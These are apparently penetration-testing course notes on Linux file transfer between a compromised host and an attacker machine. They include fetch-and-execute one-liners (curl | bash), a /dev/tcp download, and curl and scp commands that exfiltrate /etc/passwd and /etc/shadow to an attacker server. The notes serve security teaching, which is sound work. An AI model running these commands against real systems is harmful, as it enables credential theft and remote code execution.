## 1. Introduction

Linux ships with a huge toolbox for moving files around — way more built-in options than most people realize. Just like with Windows, understanding these tools benefits **both attackers and defenders**: attackers use them to move malware in or steal data out, and defenders need to recognize the "fingerprints" these tools leave behind so they can detect misuse.

Think of a Linux system like a Swiss Army knife — practically every tool you'd need for file transfer (web client, scripting, secure remote copy) is already built in, with no extra installation required.

**The two machines used throughout these notes:**

| Label | Role | Who controls it |
|---|---|---|
| **FOOT_HOLD** | The compromised / target Linux machine | You have a shell on it, but it's the "victim" box |
| **HACKER** (a.k.a. Pwnbox) | Your own attack machine | Fully under your control |

Every command below is labeled with **which machine you type it into**, since that's easy to lose track of once URLs and IP addresses start pointing in different directions.

## 2. Download Operations

**Goal:** you have a shell on **FOOT_HOLD**, and you want to pull a file onto it from **HACKER**.

### 2.1 Base64 Encoding / Decoding

This avoids needing an actual live network connection between the two machines — you manually copy-paste a text string from one terminal to another.

**Step 1 — On HACKER: fingerprint the file before transfer.**
```
$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```
*Generates the MD5 hash — a short fixed-length "fingerprint" — so you can later confirm the file arrived unmodified.*

**Step 2 — On HACKER: encode the file to base64 text.**
```
$ cat id_rsa |base64 -w 0;echo

LS0t...<SNIP>...LS0tLQo=
```
*`cat` prints the file's contents, which get piped (`|`) into `base64` to convert them into plain text. `-w 0` disables line-wrapping so it stays as one single copy-pasteable line. The trailing `;echo` just adds a blank line afterward to make copying easier — it's not part of the encoding itself.*

**Step 3 — On FOOT_HOLD: paste and decode.**
```
$ echo -n 'LS0tLS1..<SNIP>...LS0tLQo=' | base64 -d > id_rsa
```
*`echo -n` prints the pasted string without adding an extra newline, `base64 -d` decodes it back into raw bytes, and `>` redirects (saves) the output into a new file called `id_rsa`.*

**Step 4 — On FOOT_HOLD: verify integrity.**
```
$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```
*Same hash as Step 1 confirms a clean, lossless transfer.*

> **Note:** this technique works in reverse for uploads too — `cat` + `base64` encode a file on FOOT_HOLD, then paste and decode it on HACKER.

### 2.2 Web Downloads with Wget and cURL

**wget** and **curl** are the two most common command-line tools for talking to web servers on Linux, and they come pre-installed on most distributions. Both commands below are run **on FOOT_HOLD**, assuming it has outbound network access and the file is being served from somewhere reachable (here, a GitHub-hosted script, just as an example URL).

```
$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
*`wget` downloads the file at the given URL. The `-O` (capital O) flag sets the output filename/path.*

```
$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
*`curl` does the same job. Note the flag case difference: curl uses lowercase `-o` for output file, while wget uses uppercase `-O`. Easy to mix up — worth memorizing deliberately.*

### 2.3 Fileless Downloads in Linux

Because Linux pipes (`|`) let you feed the output of one program directly into another, you can often **run a script without ever saving it to disk** — similar in spirit to the PowerShell `IEX` trick from the Windows notes. Both commands below run **on FOOT_HOLD**.

> **Caveat:** some payloads (for example, ones using `mkfifo`, a command that creates a special "named pipe" file) still touch the disk in some way even though the main execution is "fileless." So "fileless" describes the *main payload's* delivery, not an absolute guarantee that zero files are ever created.

**Fileless download + execute with cURL:**
```
$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
*`curl` fetches the script's text and streams it directly into `bash`, which executes it immediately — no file is written to disk first.*

**Fileless download + execute with wget (running a Python script):**
```
$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```
*`-q` makes wget "quiet" (suppresses its normal progress output), and `-O-` tells it to send the downloaded content to standard output (the terminal) instead of a file — the dash represents "stdout." That output is then piped into `python3`, which runs it as a script.*

### 2.4 Download with Bash using /dev/tcp

For situations where none of the usual tools (`curl`, `wget`, `python`) are available on the target, Bash itself has a hidden trick: a built-in virtual device file at `/dev/tcp` that lets you open raw network connections directly from the shell — no external programs needed at all.

**Everything in this subsection is typed on FOOT_HOLD.** The IP address (`10.10.10.32`) in the example represents HACKER — the machine you're reaching *out to*.

Meanwhile, HACKER machine needs to be running an ordinary **web server** on that IP and port (in this example, port 80), already serving the file you want — exactly the kind of server covered in [2.2](#22-web-downloads-with-wget-and-curl) and [3.2](#32-alternative-web-file-transfer-mini-web-servers) (e.g. `python3 -m http.server`, serving a file called `LinEnum.sh`). 

The `/dev/tcp` trick on FOOT_HOLD is a manual, from-scratch replacement for `curl`/`wget` — it still needs a real HTTP server to talk to on the other end, it just builds the HTTP request by hand instead of letting a dedicated tool do it.

> **Requirement:** Bash version 2.04 or later, compiled with the `--enable-net-redirections` option (common, but not guaranteed, on every system).

**Step 1 — Open a connection to the web server on HACKER:**
```
$ exec 3<>/dev/tcp/10.10.10.32/80
```
*This opens a two-way (`<>`) connection to IP `10.10.10.32` (HACKER) on port `80` (standard HTTP) and assigns it to file descriptor `3` — think of a file descriptor as a numbered "channel" the shell can read from and write to, similar to how 0, 1, and 2 are reserved for standard input, output, and error.*

**Step 2 — Manually send an HTTP GET request through that channel:**
```
$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```
*`echo -e` enables interpreting `\n` as actual newlines, forming a minimal valid HTTP request by hand, and `>&3` sends that text into the channel opened in Step 1.*

**Step 3 — Read the server's response back through the same channel:**
```
$ cat <&3
```
*`cat` reads from channel 3 (`<&3`) and prints the raw HTTP response — headers and the file's content — to the screen.*

This is essentially hand-building an HTTP client using nothing but Bash's own plumbing — a good illustration of just how far "living off the land" can go when no other tools are present on the box you're sitting on.

### 2.5 SSH Downloads (SCP)

**SSH (Secure Shell)** is a protocol for securely logging into and controlling a remote computer — all traffic is encrypted. Bundled with most SSH installations is **SCP (Secure Copy)**, a command-line tool for copying files between two machines over that same secure, encrypted connection.

Think of SCP as the familiar `cp` (copy) command, just extended to work across a network — instead of only specifying local paths, you also specify a username, the remote machine's address, and credentials.

**Step 1 — On HACKER: set up an SSH server so FOOT_HOLD can connect to it.**
```
$ sudo systemctl enable ssh
```
*`systemctl enable` configures the SSH service to automatically start on every future boot (it doesn't start it immediately by itself).*

```
$ sudo systemctl start ssh
```
*This actually starts the SSH service right now, on HACKER.*

**Step 2 — On HACKER: confirm it's listening.**
```
$ netstat -lnpt

Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
```
*`netstat -lnpt` lists network connections, filtered to: Listening sockets only, show addresses Numerically (skip DNS lookups), show the Program name, and TCP only. The output confirms something is listening on port **22**, the standard SSH port.*

**Step 3 — On FOOT_HOLD: download a file from HACKER using SCP.**
```
$ scp plaintext@192.168.49.128:/root/myroot.txt .
```
*Breaking this down: `plaintext` is the username on HACKER, `192.168.49.128` is HACKER's address, `:/root/myroot.txt` is the file path on HACKER, and the trailing `.` means "save it into my current local directory" — which, since this command runs on FOOT_HOLD, is a folder on FOOT_HOLD. This pulls a file from HACKER down onto FOOT_HOLD, even though SCP syntax can describe either direction depending on which side of the `:` you put the remote path.*

> **Tip:** rather than using real, personal SSH credentials on a potentially risky remote machine, it's worth creating a disposable/temporary account just for file transfers.

## 3. Upload Operations

The same core tools used for downloads apply equally well to uploads — you're just sending data in the opposite direction, usually from **FOOT_HOLD back to HACKER**. Common scenarios calling for uploads: binary exploitation work and analyzing captured network traffic, both of which often require moving files *off* the target and onto your own analysis machine.

### 3.1 Web Upload with uploadserver (HTTPS)

This mirrors the Windows "Web Uploads" technique, but here it's extended to use **HTTPS** (encrypted HTTP) rather than plain HTTP, for a more secure transfer.

**Step 1 — On HACKER: install the uploadserver module.**
```
$ sudo python3 -m pip install --user uploadserver

Collecting uploadserver
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```
*`pip install --user` installs the Python package just for the current user account rather than system-wide.*

**Step 2 — On HACKER: generate a self-signed TLS certificate** (a certificate you create yourself rather than getting one from an official, trusted authority — fine for lab/testing use, but browsers and tools will flag it as "untrusted" by default):
```
$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

Generating a RSA private key
................................................................................+++++
.......+++++
writing new private key to 'server.pem'
-----
```
*`openssl req -x509` creates a self-signed certificate directly (rather than a certificate request that needs to be signed by someone else). `-newkey rsa:2048` generates a new 2048-bit RSA key alongside it. `-nodes` means "no DES" — i.e., don't encrypt the private key with a passphrase. `-subj '/CN=server'` sets the certificate's "Common Name" field without being prompted interactively.*

**Step 3 — On HACKER: isolate the certificate from the served directory, then start the HTTPS server.**
```
$ mkdir https && cd https
```
*Creates a fresh, empty folder and moves into it. The reasoning: you don't want your web server accidentally serving up (exposing) your own private certificate file to anyone who connects.*

```
$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```
*Starts the upload-capable server on port 443 (the standard HTTPS port), pointing it at the certificate file created in Step 2 to enable encryption. This runs on HACKER, waiting for FOOT_HOLD to connect and send files.*

**Step 4 — On FOOT_HOLD: upload sensitive files to HACKER.**
```
$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
*`-X POST` sets the HTTP method to POST (used for sending data, as opposed to GET which retrieves it). Each `-F 'files=@path'` attaches a file as form data — note that `@` before a path tells curl "read this as a file," not literal text. Multiple `-F` flags let you send several files in a single request. `--insecure` tells curl to accept the connection despite the certificate being self-signed/untrusted — acceptable here specifically because *you* created that certificate on HACKER and know it's legitimate. `192.168.49.128` is HACKER's address.*

> **Files being moved here:** `/etc/passwd` (user account info) and `/etc/shadow` (password hashes) — classic post-exploitation targets for offline password cracking.

### 3.2 Alternative Web File Transfer (Mini Web Servers)

Since most Linux systems already have Python (or PHP) installed, you can spin up a basic web server in seconds — no dedicated software needed. This gives huge flexibility: you can instantly change which folder is served or which port is used.

**Important wrinkle:** if FOOT_HOLD is *itself* already running a website, you could simply move your target file into its existing website folder and then pull it down over the web from HACKER — meaning the "upload" ends up looking like a normal download from HACKER's perspective.

A bigger catch: when you start a brand-new web server on FOOT_HOLD, **inbound** traffic to that new port might be blocked by a firewall, even if outbound traffic isn't. In that case, the direction effectively reverses — you're technically *downloading* from FOOT_HOLD rather than "uploading" to HACKER, since HACKER has to reach out and fetch the file instead of FOOT_HOLD pushing it.

**On FOOT_HOLD: spin up a quick server in whichever language is available.**

```
$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
*Python 3's built-in module, serving the current directory on port 8000 by default.*

```
$ python2.7 -m SimpleHTTPServer

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
*The equivalent module name under the older Python 2.7.*

```
$ php -S 0.0.0.0:8000

[Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
```
*PHP's own built-in development server, using `-S` to bind to an address and port.*

```
$ ruby -run -ehttpd . -p8000

[2022-05-23 09:35:46] INFO  WEBrick 1.6.1
[2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
[2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000
```
*Ruby's `-run -ehttpd` launches its built-in WEBrick web server module, serving the current directory (`.`) on port 8000 (`-p8000`).*

**On HACKER: fetch the file being "uploaded" from FOOT_HOLD.**
```
$ wget 192.168.49.128:8000/filetotransfer.txt

--2022-05-20 08:13:05--  http://192.168.49.128:8000/filetotransfer.txt
Connecting to 192.168.49.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 0 [text/plain]
Saving to: 'filetotransfer.txt'

filetotransfer.txt                       [ <=>                                                                  ]       0  --.-KB/s    in 0s      

2022-05-20 08:13:05 (0.00 B/s) - ‘filetotransfer.txt’ saved [0/0]
```
*Note the IP here (`192.168.49.128`) is actually FOOT_HOLD's address in this scenario — the mini web server from the previous step. This looks identical to a normal download — which is exactly the point. The "upload" is achieved by having FOOT_HOLD serve the file while HACKER pulls it.*

### 3.3 SCP Upload

If a target network happens to allow outbound SSH (TCP/22) — which some organizations do — you can use the same SCP tool from the download section to push files from **FOOT_HOLD** to a remote machine instead of pulling them.

```
$ scp /etc/passwd hacker@10.129.86.90:/home/hacker/

hacker@10.129.86.90's password: 
passwd
	100% 3414     6.7MB/s   00:00
```
*Run on FOOT_HOLD. Reading left to right: `/etc/passwd` is the local file (on FOOT_HOLD) being sent, `hacker` is the username on the remote machine, `10.129.86.90` is that remote machine's address, and `:/home/hacker/` is the destination folder there. The progress output confirms the full 3,414-byte file transferred successfully at roughly 6.7 MB/s.*

> **Reminder:** SCP's syntax deliberately mirrors `cp`/`copy` — the only real difference is adding a `user@host:` prefix to describe a remote location instead of a local one. Whichever path comes first is the source, whichever comes second is the destination — that's what determines upload vs. download, not anything else about the command.

## 5. Cheat Sheet

| Goal | Tool | Run on | Key Command |
|---|---|---|---|
| Encode file to text | Local | sender | `cat file \| base64 -w 0; echo` |
| Decode text to file | Local | receiver | `echo -n '<b64>' \| base64 -d > file` |
| Verify file integrity | Local | both | `md5sum file` |
| Download a file | wget | target | `wget URL -O /path/to/output` |
| Download a file | curl | target | `curl -o /path/to/output URL` |
| Fileless download + run (shell script) | curl | target | `curl URL \| bash` |
| Fileless download + run (Python script) | wget | target | `wget -qO- URL \| python3` |
| Download with zero external tools | Bash | target | `exec 3<>/dev/tcp/IP/PORT` then `echo -e "GET /path HTTP/1.1\n\n">&3` then `cat <&3` (needs a real web server already running on IP:PORT) |
| Enable/start SSH server | systemd | attack box | `sudo systemctl enable ssh` / `sudo systemctl start ssh` |
| Check listening ports | netstat | attack box | `netstat -lnpt` |
| Download file via SCP | scp | target | `scp user@IP:/remote/path .` |
| Upload file via SCP | scp | target | `scp /local/path user@IP:/remote/path` |
| Create a self-signed cert | openssl | attack box | `openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'` |
| Start HTTPS upload server | uploadserver | attack box | `python3 -m uploadserver 443 --server-certificate ~/server.pem` |
| Upload file(s) via HTTP POST | curl | target | `curl -X POST URL/upload -F 'files=@/path' --insecure` |
| Quick web server (Python3) | — | target | `python3 -m http.server` |
| Quick web server (Python2.7) | — | target | `python2.7 -m SimpleHTTPServer` |
| Quick web server (PHP) | — | target | `php -S 0.0.0.0:8000` |
| Quick web server (Ruby) | — | target | `ruby -run -ehttpd . -p8000` |

## 6. Big-Picture Takeaways

1. **HTTP/HTTPS dominates for a reason.** Even on Linux, which natively supports FTP and SMB, HTTP/HTTPS traffic is the most reliably allowed outbound through firewalls, which is why it shows up constantly across these techniques.
2. **"Fileless" is about where execution happens, not a strict guarantee.** Piping output directly into `bash` or `python3` skips saving the main payload to disk, but some techniques (like `mkfifo`) can still leave minor traces.
3. **When all else fails, the shell itself can be the tool.** Bash's `/dev/tcp` feature means that even a Linux box stripped of `curl`, `wget`, and `python` may still be able to fetch files — as long as there's a real server on the other end to talk to, since this trick replaces the client, not the server.
4. **Direction is defined by who initiates the connection, not just which way data flows.** The "alternative web transfer" technique shows that "uploading" a file can actually involve the attacker's machine *pulling* (downloading) it — the file still moves from target to attacker, but the connection is initiated the opposite way, which matters a lot for firewall rules.
5. **Encryption matters, even in test/lab setups.** The HTTPS upload example demonstrates good practice — using TLS (even via a self-signed cert) to protect data in transit rather than defaulting to plaintext HTTP.
6. **SCP transfer direction is just about argument order.** Since SCP mirrors `cp` syntax, whichever path (local or `user@host:path`) comes first is the source, and whichever comes second is the destination — the same command structure handles both uploads and downloads.
7. **Always track which machine you're typing into.** Nearly every mix-up in these techniques comes from running a command on the wrong box — labeling each command by machine (as done throughout these notes) avoids that confusion.
